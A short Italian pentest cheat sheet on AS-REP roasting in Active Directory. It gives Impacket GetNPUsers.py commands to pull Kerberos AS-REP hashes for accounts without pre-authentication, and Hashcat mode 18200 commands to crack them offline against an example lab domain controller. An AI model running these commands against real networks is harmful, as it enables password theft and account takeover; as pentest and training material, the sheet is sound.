# ASREProasting (Windows)

| Caratteristica | Dettaglio |
| :--- | :--- |
| **Tool necessari** | `Impacket (GetNPUsers.py)`, `Hashcat`, `NetExec` |
| **SO Target** | Windows (Active Directory) |
| **Quando effettuare** | Se un utente ha l'opzione "Do not require Kerberos preauthentication" attiva |
| **Info Utili** | Estrazione di ticket AS-REP per cracking offline delle password |

### Funzionamento
L'attacco mira agli utenti che non richiedono la pre-autenticazione Kerberos. È possibile richiedere un ticket AS-REP per questi utenti senza conoscere la loro password.

### Estrazione Ticket (Linux)
Utilizzando Impacket `GetNPUsers.py`.

**Comando Generico (con lista utenti):**
```bash
GetNPUsers.py <DOMAIN>/ -userfile <USER_FILE> -format hashcat -outputfile <OUTPUT_FILE> -dc-ip <DC_IP>
```
*Esempio:*
```bash
GetNPUsers.py eh.local/ -userfile staff.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.119
```

**Comando Generico (singolo utente):**
```bash
GetNPUsers.py <DOMAIN>/<USER> -request -no-pass -dc-ip <DC_IP>
```
*Esempio:*
```bash
GetNPUsers.py eh.local/paul.taylor -request -no-pass -dc-ip 10.10.10.119
```

### Cracking offline (Hashcat)
Il formato del ticket è `$krb5asrep$23$`.

**Comando Generico:**
```bash
hashcat -m 18200 <HASH_FILE> <PATH_TO_WORDLIST>
```
*Esempio:*
```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
```

### URL Fondamentali
- [The Hacker Recipes - ASREProasting](https://www.thehacker.recipes/ad/movement/kerberos/asreproasting)
- [Hacktricks ASREProasting](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproasting.html)
- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
